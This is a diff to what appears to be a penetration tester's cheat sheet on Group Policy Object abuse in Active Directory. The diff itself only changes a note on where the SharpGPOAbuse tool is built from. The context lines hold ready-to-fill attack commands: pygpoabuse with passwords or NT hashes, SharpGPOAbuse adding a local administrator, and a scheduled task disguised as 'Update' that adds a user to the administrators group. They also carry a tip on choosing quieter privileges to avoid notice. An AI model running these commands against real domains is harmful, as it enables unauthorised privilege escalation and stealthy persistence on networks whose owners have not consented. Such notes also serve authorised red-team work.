@@ -16,7 +16,7 @@ python3 pygpoabuse.py '<Domain>/<Username>:<Password>' -gpo-id 'THE-GPO-ID' -com
 - [ ] An NT hash instead of the password: add -hashes ':<Hash>'
 
 ## From a Windows shell
-SharpGPOAbuse from my own tools, into upload/ for serve, run as the account that can edit the GPO.
+SharpGPOAbuse, built from https://github.com/FSecureLABS/SharpGPOAbuse, which publishes no binary, into upload/ for serve, run as the account that can edit the GPO.
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <Username> --GPOName 'THE-GPO-NAME'
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author <Domain>\<Username> --Command 'cmd.exe' --Arguments '/c net localgroup administrators <Username> /add' --GPOName 'THE-GPO-NAME'
 - [ ] --AddUserRights with SeDebugPrivilege or SeTakeOwnershipPrivilege is quieter than a local admin
